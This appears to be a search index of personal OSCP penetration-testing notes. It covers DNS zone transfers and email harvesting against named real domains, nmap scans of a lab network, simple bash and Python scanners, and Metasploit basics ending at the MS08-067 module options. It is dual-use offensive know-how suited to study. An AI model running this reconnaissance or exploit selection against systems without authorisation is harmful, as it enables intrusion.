exchanger = 20 ALT1.ASPMX.L.GOOGLE.com. bulbsecurity.com mail exchanger = 50 ASPMX3.GOOGLEMAIL.com. bulbsecurity.com mail exchanger = 30 ALT2.ASPMX.L.GOOGLE.com. bulbsecurity.com mail exchanger = 10 ASPMX.L.GOOGLE.com. Nslookup says bulbsecurity.com is using Google Mail for its email servers","title":"Nslookup"},{"location":"oscp/recon/information-gathering/#host","text":"Another utility for DNS queries is Host syntax: host -t ns <domain> 1 2 3 4 root@kali:~# host -t ns zoneedit.com zoneedit.com name server ns4.zoneedit.com. zoneedit.com name server ns3.zoneedit.com. --snip-- The above output shows all the DNS servers for the website.","title":"Host"},{"location":"oscp/recon/information-gathering/#zone_transfers","text":"DNS zone transfers allow name servers to replicate all the entries about a domain. many system administrators set up DNS zone transfers insecurely, so that anyone can transfer the DNS records for a domain use the l option to specify the domain to transfer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@kali:~# host -l zoneedit.com ns2.zoneedit.com Using domain server: Name: ns2.zoneedit.com Address: 69.72.158.226#53 Aliases: zoneedit.com name server ns4.zoneedit.com. zoneedit.com name server ns3.zoneedit.com. zoneedit.com name server ns15.zoneedit.com. zoneedit.com name server ns8.zoneedit.com. zoneedit.com name server ns2.zoneedit.com. zoneedit.com has address 64.85.73.107 www1.zoneedit.com has address 64.85.73.41 dynamic.zoneedit.com has address 64.85.73.112 bounce.zoneedit.com has address 64.85.73.100 --snip-- mail2.zoneedit.com has address 67.15.232.182 --snip- mail2.zoneedit.com is probably a mail server, so we should look for potentially vulnerable software running on typical email ports such as 25 (Simple Mail Transfer Protocol) and 110 (POP3). If we can find a webmail server, any usernames we find may lead us in the right direction so that we can guess passwords and gain access to sensitive company emails.","title":"Zone Transfers"},{"location":"oscp/recon/information-gathering/#searching_for_email_addresses","text":"One way to find usernames is by looking for email addresses on the Internet. a python tool called theHarvester can quickly scour thousands of search engine results for possible email addresses to look into the first 500 results in search engines for bulbsecurity.com use 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root@kali:~# theharvester -d bulbsecurity.com -l 500 -b all ******************************************************************* * * * | |_| |__ ___ /\\ /\\__ _ _ ____ _____ ___| |_ ___ _ __ * * | __| '_ \\ / _ \\ / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__| * * | |_| | | | __/ / __ / (_| | | \\ V / __/\\__ \\ || __/ | * * \\__|_| |_|\\___| \\/ /_/ \\__,_|_| \\_/ \\___||___/\\__\\___|_| * * * * TheHarvester Ver. 2.2a * * Coded by Christian Martorella * * Edge-Security Research * * cmartorella@edge-security.com * ******************************************************************* Full harvest.. [-] Searching in Google.. Searching 0 results... Searching 100 results... Searching 200 results... Searching 300 results... --snip-- [+] Emails found: ------------------ georgia@bulbsecurity.com [+] Hosts found in search engines: ------------------------------------ 50.63.212.1:www.bulbsecurity.com --snip--","title":"Searching For Email Addresses"},{"location":"oscp/recon/information-gathering/#maltego","text":"a data-mining tool designed to visualize open source intelligence gathering To run Maltego, run maltego at the command line. The Maltego GUI should launch. 1 root@kali:~# maltego Now select the Palette option from the left-hand border. As you can see, we can gather information about all sorts of entities. Let\u2019s start with the bulbsecurity.com domain Drag a Domain entity from the Palette onto the new graph. By default, the domain is paterva.com. To change it to bulbsecurity.com, either double-click the text or change the text field at the right side of the screen. Once the domain is set, you can run transforms. Right-click the domain icon and choosing Run Transform Maltego finds that www.bulbsecurity.com is an Apache web server with PHP, Flash, and so on, along with a WordPress install.","title":"Maltego"},{"location":"oscp/recon/information-gathering/#port_scanning","text":"finding which systems / services are active and which software to talk to","title":"Port Scanning"},{"location":"oscp/recon/information-gathering/#manual_port_scanning","text":"Exploiting the MS08-067 vulnerability can be an easy win for attackers and pentesters alike. To use this exploit, we need to find a Windows 2000, XP, or 2003 box with an SMB server that is missing the MS08-067 Microsoft patch available on the network. We can get a good idea about the network-based attack surface by mapping the network range and querying systems for listening ports. Port scanning can be done manually by connecting to ports with a tool such as telnet or netcat 1 2 3 4 5 6 7 8 root@kali:~# nc -vv 192.168.20.10 25 nc: 192.168.20.10 (192.168.20.10) 25 [smtp] open nc: using stream socket nc: using buffer size 8192 nc: read 66 bytes from remote 220 bookxp SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here nc: wrote 66 bytes to local The Windows XP box is running an SMTP server on port 25. After we connected, the SMTP server announced itself as SLMail -version 5.5.0.4433. Tip connecting to every possible TCP and UDP port on just one machine and noting the results can be time consuming. Port scanning tools such as NMap can be used to find listening ports","title":"Manual Port Scanning"},{"location":"oscp/recon/information-gathering/#automated_port_scanning_-_nmap","text":"NMap is the industry standard for port scanning Note If NMap scan does not return any result, it is likely that intrusion detection systems / firewall have blocked the scan traffic","title":"Automated Port Scanning - NMap"},{"location":"oscp/recon/information-gathering/#a_syn_scan","text":"A SYN scan is a TCP scan that does not finish the TCP handshake. A TCP connection starts with a three-way handshake: SYN \u25b8 SYN-ACK \u25b8 ACK sequenceDiagram System1->>System2: SYN System2->>System1: SYN-ACK System1->>System2: ACK In a SYN scan, Nmap sends the SYN and waits for the SYN-ACK if the port is open but never sends the ACK to complete the connection. If the SYN packet receives no SYN-ACK response, the port is not available; either it\u2019s closed or the connection is being filtered. syntax: for a SYN scan is -sS flag syntax: for outputing in all formats use -oA flag this will output the reports in nmap, gnmap (greppable nmap) and in xml formats the reports can be imported in tools to read and analyze 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 root@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST Nmap scan report for 192.168.20.10 Host is up (0.00056s latency). Not shown: 991 closed ports PORT STATE SERVICE 21/tcp open ftp \u2777 25/tcp open smtp \u277a 80/tcp open http \u2778 106/tcp open pop3pw \u277a 110/tcp open pop3 \u277a 135/tcp open msrpc 139/tcp open netbios-ssn \u2779 443/tcp open https \u2778 445/tcp open microsoft-ds \u2779 1025/tcp open NFS-or-IIS 3306/tcp open mysql \u277b 5000/tcp open upnp MAC Address: 00:0C:29:A5:C1:24 (VMware) Nmap scan report for 192.168.20.11 Host is up (0.00031s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp \u2777 22/tcp open ssh 80/tcp open http \u2778 111/tcp open rpcbind 139/tcp open netbios-ssn \u2779 445/tcp open microsoft-ds \u2779 2049/tcp open nfs MAC Address: 00:0C:29:FD:0E:40 (VMware) Nmap scan report for 192.168.20.12 Host is up (0.0014s latency). Not shown: 999 filtered ports PORT STATE SERVICE 80/tcp open http \u2776 135/tcp open msrpc MAC Address: 00:0C:29:62:D5:C8 (VMware) Nmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds Note Port Service 69 TFTP - UDP port 80 HTTP Web Service 139 Remote Procedure Call","title":"A SYN Scan"},{"location":"oscp/recon/information-gathering/#a_version_scan","text":"SYN scan does not tell which software is listening on the open ports syntax: for nmap full TCP scan nmap -sT systax: for nmap version scan nmap -sV yeilds more data 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 root @ kali :~ # nmap -sV 192 . 168 . 20 . 10-12 -oA bookversionnmap Starting Nmap 6 . 40 ( http :// nmap . org ) at 2015-12-18 08 : 29 EST Nmap scan report for 192 . 168 . 20 . 10 Host is up ( 0 . 00046s latency ). Not shown : 991 closed ports PORT STATE SERVICE VERSION 21 / tcp open ftp FileZilla ftpd 0 . 9 . 32 beta 25 / tcp open smtp SLmail smtpd 5 . 5 . 0 . 4433 79 / tcp open finger SLMail fingerd 80 / tcp open http Apache httpd 2 . 2 . 12 (( Win32 ) DAV / 2 mod_ssl / 2 . 2 . 12 OpenSSL / 0 . 9 . 8k mod_autoindex_color PHP / 5 . 3 . 0 mod_perl / 2 . 0 . 4 Perl / v5 . 10 . 0 ) 106 / tcp open pop3pw SLMail pop3pw 110 / tcp open pop3 BVRP Software SLMAIL pop3d 135 / tcp open msrpc Microsoft Windows RPC 139 / tcp open netbios-ssn 443 / tcp open ssl / http Apache httpd 2 . 2 . 12 (( Win32 ) DAV / 2 mod_ssl / 2 . 2 . 12 OpenSSL / 0 . 9 . 8k mod_autoindex_color PHP / 5 . 3 . 0 mod_perl / 2 . 0 . 4 Perl / v5 . 10 . 0 ) 445 / tcp open microsoft-ds Microsoft Windows XP microsoft-ds 1025 / tcp open msrpc Microsoft Windows RPC 3306 / tcp open mysql MySQL ( unauthorized ) 5000 / tcp open upnp Microsoft Windows UPnP MAC Address : 00 : 0C : 29 : A5 : C1 : 24 ( Vmware ) Service Info : Host : georgia . com ; OS : Windows ; CPE : cpe :/ o : microsoft : windows Nmap scan report for 192 . 168 . 20 . 11 Host is up ( 0 . 00065s latency ). Not shown : 993 closed ports PORT STATE SERVICE VERSION 21 / tcp open ftp vsftpd 2 . 3 . 4 \u2776 22 / tcp open ssh OpenSSH 5 . 1p1 Debian 3ubuntu1 ( protocol 2 . 0 ) 80 / tcp open http Apache httpd 2 . 2 . 9 (( Ubuntu ) PHP / 5 . 2 . 6-2ubuntu4 . 6 with Suhosin-Patch ) 111 / tcp open rpcbind ( rpcbind V2 ) 2 ( rpc # 100000 ) 139 / tcp open netbios-ssn Samba smbd 3 . X ( workgroup : WORKGROUP ) 445 / tcp open netbios-ssn Samba smbd 3 . X ( workgroup : WORKGROUP ) 2049 / tcp open nfs ( nfs V2-4 ) 2-4 ( rpc # 100003 ) MAC Address : 00 : 0C : 29 : FD : 0E : 40 ( VMware ) Service Info : OSs : Unix , Linux ; CPE : cpe :/ o : linux : kernel Nmap scan report for 192 . 168 . 20 . 12 Host is up ( 0 . 0010s latency ). Not shown : 999 filtered ports PORT STATE SERVICE VERSION 80 / tcp open http Microsoft IIS httpd 7 . 5 135 / tcp open msrpc Microsoft Windows RPC MAC Address : 00 : 0C : 29 : 62 : D5 : C8 ( VMware ) Service detection performed . Please report any incorrect results at http :// nmap . org / submit / . Nmap done : 3 IP addresses ( 3 hosts up ) scanned in 20 . 56 seconds Note Keep in mind that Nmap may report the wrong version in some cases (for instance, if the software has been updated, but the welcome banner is not edited as part of the patch), but at the very least, its version scan gave us a good place to begin further research.","title":"A Version Scan"},{"location":"oscp/recon/information-gathering/#udp_scans","text":"Both Nmap\u2019s SYN and version scans are TCP scans that do not query UDP ports Scanning logic of UDP is different. Nmap sends a packet. If the port is open, the packet is received else, an ICMP Port Unreachable message is sent. sequenceDiagram Nmap->>system1: sends a packet system1-->>Nmap: packet received - no error - port open system1->>Nmap: ICMP error - port closed syntax: nmap -sU flag is used for UDP scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 root @ kali :~ # nmap -sU 192 . 168 . 20 . 10-12 -oA bookudp Starting Nmap 6 . 40 ( http :// nmap . org ) at 2015-12-18 08 : 39 EST Stats : 0 : 11 : 43 elapsed ; 0 hosts completed ( 3 up ), 3 undergoing UDP Scan UDP Scan Timing : About 89 . 42 % done ; ETC : 08 : 52 ( 0 : 01 : 23 remaining ) Nmap scan report for 192 . 168 . 20 . 10 Host is up ( 0 . 00027s latency ). Not shown : 990 closed ports PORT STATE SERVICE 69 / udp open | filtered tftp \u2776 123 / udp open ntp 135 / udp open msrpc 137 / udp open netbios-ns 138 / udp open | filtered netbios-dgm 445 / udp open | filtered microsoft-ds 500 / udp open | filtered isakmp 1026 / udp open win-rpc 1065 / udp open | filtered syscomlan 1900 / udp open | filtered upnp MAC Address : 00 : 0C : 29 : A5 : C1 : 24 ( VMware ) Nmap scan report for 192 . 168 . 20 . 11 Host is up ( 0 . 00031s latency ). Not shown : 994 closed ports PORT STATE SERVICE 68 / udp open | filtered dhcpc 111 / udp open rpcbind 137 / udp open netbios-ns 138 / udp open | filtered netbios-dgm 2049 / udp open nfs \u2777 5353 / udp open zeroconf MAC Address : 00 : 0C : 29 : FD : 0E : 40 ( VMware ) Nmap scan report for 192 . 168 . 20 . 12 Host is up ( 0 . 072s latency ). Not shown : 999 open | filtered ports PORT STATE SERVICE 137 / udp open netbios-ns MAC Address : 00 : 0C : 29 : 62 : D5 : C8 ( VMware ) Nmap done : 3 IP addresses ( 3 hosts up ) scanned in 1073 . 86 seconds","title":"UDP Scans"},{"location":"oscp/recon/information-gathering/#scanning_a_specific_port","text":"By default, Nmap scans only the 1,000 ports it considers the most \u201cinteresting,\u201d not the 65,535 possible TCP or UDP ports. syntax: use the -p flag to scan specific ports 1 2 3 4 5 6 7 8 root@Kali:~# nmap -sS -p 3232 192.168.20.10 Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 09:03 EST Nmap scan report for 192.168.20.10 Host is up (0.00031s latency). PORT STATE SERVICE 3232/tcp open unknown MAC Address: 00:0C:29:A5:C1:24 (VMware) running a version scan against a specific port this may sometime crash the service but some information can be obtained In the process of crashing the listening service, Nmap can\u2019t figure out what software is running as noted at \u2776, but it does manage to get a fingerprint of the service. Based on the HTML tags in the fingerprint at \u2777, this service appears to be a web server. According to the Server: field, it is something called Zervit 0.4 \u2778. 1 2 3 4 5 6 7 8 9 10 11 12 13 root@kali:~# nmap -p 3232 -sV 192.168.20.10 Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT Nmap scan report for 192.168.20.10 Host is up (0.00031s latency). PORT STATE SERVICE VERSION 3232/tcp open unknown 1 service unrecognized despite returning data\u2776. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi : \u2777 SF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR SF:equest,B8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Zervit\\x200\\.4\\r\\n\u2778X-Pow SF:ered-By:\\x20Carbono\\r\\nConnection:\\x20close\\r\\nAccept-Ranges:\\x20bytes\\ SF:r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x2036\\r\\n\\r\\n <html> \\r\\ SF:n <body> \\r\\nhi\\r\\n </body> \\r\\n </html> \"); MAC Address: 00:0C:29:13:FA:E3 (VMware)","title":"Scanning A Specific Port"},{"location":"oscp/scanning/network_discovery/","text":"","title":"Network discovery"},{"location":"programming/bash-scripting/","text":"A Simple Bash Script writing the script use a text editor like nano / vim to write the script 1 2 3 \\#!/bin/bash echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" First line specifies the terminal to use the Bash interpreter After creating the script, use chmod to make it executable 1 root@kali:~# chmod 744 pingscript.sh running the script check path Before running the script, ensure the script folder is in the path 1 2 root@kali:~# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin next run the script 1 2 3 root@kali:~# ./pingscript.sh Usage: ./pingscript.sh [network] example: ./pingscript.sh 192.168.20 If Statement 1 2 3 4 5 6 #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" fi open the if construct with the if keyword $1 is the first argument == checks for equality if the condition is true, use the then keyword to specify list of actions close the if construct with the fi keyword output 1 2 3 root@kali:~/# ./pingscript.sh Usage: ./pingscript.sh [network] example: ./pingscript.sh 192.168.20 For Loop 1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x done fi for loop starts with the for keyword range can be specified using the seq keyword do and done are both used to signify opening and closing of for loop variables can be referenced by using the dollar $ symbol running the script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@kali:~/# ./pingscript.sh 192.168.20 PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data. 64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms \u2776 --- 192.168.20.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms PING 192.168.20.2(192.168.20.2) 56(84) bytes of data. 64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms --- 192.168.20.2 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms PING 192.168.20.3 (192.168.20.3) 56(84) bytes of data. From 192.168.20.13 icmp_seq=1 Destination Host Unreachable \u2777 --- 192.168.20.3 ping statistics --- 1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms --snip-- Streamlining The Results using grep to filter results 1 2 3 4 5 6 7 8 9 10 #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" done fi output 1 2 3 4 5 root@kali:~/# ./pingscript.sh 192.168.20 64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms 64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=68.4 ms 64 bytes from 192.168.20.8: icmp_req=1 ttl=64 time=43.1 ms --_snip_-- further refining with the cut command 1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" | cut -d \" \" -f4 done fi output 1 2 3 4 5 root@kali:~/mydirectory# ./pingscript.sh 192.168.20 192.168.20.1: 192.168.20.2: 192.168.20.8: --_snip_-- further refining with the sed command 1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" | cut -d \" \" -f4 | sed 's/.$//' done fi output 1 2 3 4 5 root@kali:~/# ./pingscript.sh 192.168.20 192.168.20.1 192.168.20.2 192.168.20.8 --_snip_--","title":"Bash Scripting"},{"location":"programming/bash-scripting/#a_simple_bash_script","text":"writing the script use a text editor like nano / vim to write the script 1 2 3 \\#!/bin/bash echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" First line specifies the terminal to use the Bash interpreter After creating the script, use chmod to make it executable 1 root@kali:~# chmod 744 pingscript.sh running the script check path Before running the script, ensure the script folder is in the path 1 2 root@kali:~# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin next run the script 1 2 3 root@kali:~# ./pingscript.sh Usage: ./pingscript.sh [network] example: ./pingscript.sh 192.168.20","title":"A Simple Bash Script"},{"location":"programming/bash-scripting/#if_statement","text":"1 2 3 4 5 6 #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" fi open the if construct with the if keyword $1 is the first argument == checks for equality if the condition is true, use the then keyword to specify list of actions close the if construct with the fi keyword output 1 2 3 root@kali:~/# ./pingscript.sh Usage: ./pingscript.sh [network] example: ./pingscript.sh 192.168.20","title":"If Statement"},{"location":"programming/bash-scripting/#for_loop","text":"1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x done fi for loop starts with the for keyword range can be specified using the seq keyword do and done are both used to signify opening and closing of for loop variables can be referenced by using the dollar $ symbol running the script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@kali:~/# ./pingscript.sh 192.168.20 PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data. 64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms \u2776 --- 192.168.20.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms PING 192.168.20.2(192.168.20.2) 56(84) bytes of data. 64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms --- 192.168.20.2 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms PING 192.168.20.3 (192.168.20.3) 56(84) bytes of data. From 192.168.20.13 icmp_seq=1 Destination Host Unreachable \u2777 --- 192.168.20.3 ping statistics --- 1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms --snip--","title":"For Loop"},{"location":"programming/bash-scripting/#streamlining_the_results","text":"using grep to filter results 1 2 3 4 5 6 7 8 9 10 #!/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" done fi output 1 2 3 4 5 root@kali:~/# ./pingscript.sh 192.168.20 64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms 64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=68.4 ms 64 bytes from 192.168.20.8: icmp_req=1 ttl=64 time=43.1 ms --_snip_-- further refining with the cut command 1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" | cut -d \" \" -f4 done fi output 1 2 3 4 5 root@kali:~/mydirectory# ./pingscript.sh 192.168.20 192.168.20.1: 192.168.20.2: 192.168.20.8: --_snip_-- further refining with the sed command 1 2 3 4 5 6 7 8 9 10 \\# !/bin/bash if [ \" $1 \" == \"\" ] then echo \"Usage: ./pingscript.sh [network]\" echo \"example: ./pingscript.sh 192.168.20\" else for x in ` seq 1 254 ` ; do ping -c 1 $1 . $x | grep \"64 bytes\" | cut -d \" \" -f4 | sed 's/.$//' done fi output 1 2 3 4 5 root@kali:~/# ./pingscript.sh 192.168.20 192.168.20.1 192.168.20.2 192.168.20.8 --_snip_--","title":"Streamlining The Results"},{"location":"programming/c-programming/","text":"C Basics Writing writing a c program GCC - GNU Compiler Collection allows to complie C code to run on the system 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include <stdio.h> int main ( int argc , char * argv []) { if ( argc < 2 ) { printf ( \"%s \\n \" , \"Pass your name as an argument\" ); return 0 ; } else { printf ( \"Hello %s \\n \" , argv [ 1 ]); return 0 ; } } import stdio.h - standard input and output library statements end with a semi-colon use the return statement to exit the function main Compiling compiling the C program 1 root@kali:~# gcc cprogram.c -o cprogram -o flag is used to mention the output file running the C program 1 2 root@kali:~# ./cprogram Pass your name as an argument to use with an argument 1 2 root@kali:~# ./cprogram hazeez Hello hazeez","title":"C Programming"},{"location":"programming/c-programming/#c_basics","text":"","title":"C Basics"},{"location":"programming/c-programming/#writing","text":"writing a c program GCC - GNU Compiler Collection allows to complie C code to run on the system 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include <stdio.h> int main ( int argc , char * argv []) { if ( argc < 2 ) { printf ( \"%s \\n \" , \"Pass your name as an argument\" ); return 0 ; } else { printf ( \"Hello %s \\n \" , argv [ 1 ]); return 0 ; } } import stdio.h - standard input and output library statements end with a semi-colon use the return statement to exit the function main","title":"Writing"},{"location":"programming/c-programming/#compiling","text":"compiling the C program 1 root@kali:~# gcc cprogram.c -o cprogram -o flag is used to mention the output file running the C program 1 2 root@kali:~# ./cprogram Pass your name as an argument to use with an argument 1 2 root@kali:~# ./cprogram hazeez Hello hazeez","title":"Compiling"},{"location":"programming/python-programming/","text":"Python Scripting a simple python script attach to a port on a system and see if a port is listening 1 2 3 #!/usr/bin/python ip = raw_input ( \"Enter the ip: \" ) port = input ( \"Enter the port: \" ) #!/usr/bin/python indicates which interpreter to be used after saving the file, make the script executable 1 2 3 4 root@kali:~/mydirectory# chmod 744 pythonscript.py root@kali:~/mydirectory# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 80 add port scanning functionality 1 2 3 4 5 6 7 8 9 #!/usr/bin/python import socket ip = raw_input ( \"Enter the ip: \" ) port = input ( \"Enter the port: \" ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) if s . connect_ex (( ip , port )): print \"Port\" , port , \"is closed\" else : print \"Port\" , port , \"is open\" use the socket library to perform networking tasks in python syntax for creating a TCP network socket is s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect to a port using the connect function. use connect_ex as it returns an error code instad of raising an exception like connect running the python script again 1 2 3 4 root@kali:~/# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 80 Port 80 is open run the script against port 81 1 2 3 4 root@kali:~/# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 81 Port 81 is closed","title":"Python Programming"},{"location":"programming/python-programming/#python_scripting","text":"a simple python script attach to a port on a system and see if a port is listening 1 2 3 #!/usr/bin/python ip = raw_input ( \"Enter the ip: \" ) port = input ( \"Enter the port: \" ) #!/usr/bin/python indicates which interpreter to be used after saving the file, make the script executable 1 2 3 4 root@kali:~/mydirectory# chmod 744 pythonscript.py root@kali:~/mydirectory# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 80 add port scanning functionality 1 2 3 4 5 6 7 8 9 #!/usr/bin/python import socket ip = raw_input ( \"Enter the ip: \" ) port = input ( \"Enter the port: \" ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) if s . connect_ex (( ip , port )): print \"Port\" , port , \"is closed\" else : print \"Port\" , port , \"is open\" use the socket library to perform networking tasks in python syntax for creating a TCP network socket is s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect to a port using the connect function. use connect_ex as it returns an error code instad of raising an exception like connect running the python script again 1 2 3 4 root@kali:~/# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 80 Port 80 is open run the script against port 81 1 2 3 4 root@kali:~/# ./pythonscript.py Enter the ip: 192.168.20.10 Enter the port: 81 Port 81 is closed","title":"Python Scripting"},{"location":"tools/metasploit/","text":"Metasploit Basics Starting Metasploit Metasploit uses postgresql as the backend database start the postgresql database 1 root@kali:~# service postgresql start The command creates a postgresql user msf3 and a database to store the data start the webserver 1 root@kali:~# service metasploit start The above command starts metasploit's Remote Procedure Call (RPC) server and web server start the interface There are multiple interfaces to metasploit. msfconsole is a text based interface to metasploit. 1 root@kali:~# msfconsole The above command will start a console 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| Large pentest? List, sort, group, tag and search your hosts and services in Metasploit Pro -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0] + -- --=[ 1246 exploits - 678 auxiliary - 198 post + -- --=[ 324 payloads - 32 encoders - 8 nops msf > getting help use the help command to get help 1 2 3 4 5 msf > help route Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid] Route traffic destined to a given subnet through a supplied session. The default comm is Local... Finding Metasploit Modules Metasploit also has an online database of modules ( http://www.rapid7.com/db/modules/ ) and a built-in search function that can be used to search for the correct modules. built-in search searching for a metasploit module - use the search command 1 2 3 4 5 6 7 8 9 10 msf > search ms08-067 Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server Service Relative Path Stack Corruption exploit/windows/smb/ms08_067_netapi is the module name getting more info about the module - use the info command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 msf > info exploit/windows/smb/ms08_067_netapi \u2776Name: Microsoft Server Service Relative Path Stack Corruption \u2777Module: exploit/windows/smb/ms08_067_netapi Version: 0 \u2778Platform: Windows \u2779Privileged: Yes License: Metasploit Framework License (BSD) \u277aRank: Great \u277b Available targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal --snip-- 67 Windows 2003 SP2 Spanish (NX) \u277c Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) \u277d Payload information: Space: 400 Avoid: 8 characters \u277e Description: This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in development. \u277f References: http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx Enabling The Module use the use command to set the exploit module 1 2 msf > use windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) > Setting Module Options use the show options command to show the module options that need to be set 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf exploit ( ms08_067_netapi ) > show options Module options ( exploit / windows / smb / ms08_067_netapi ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port 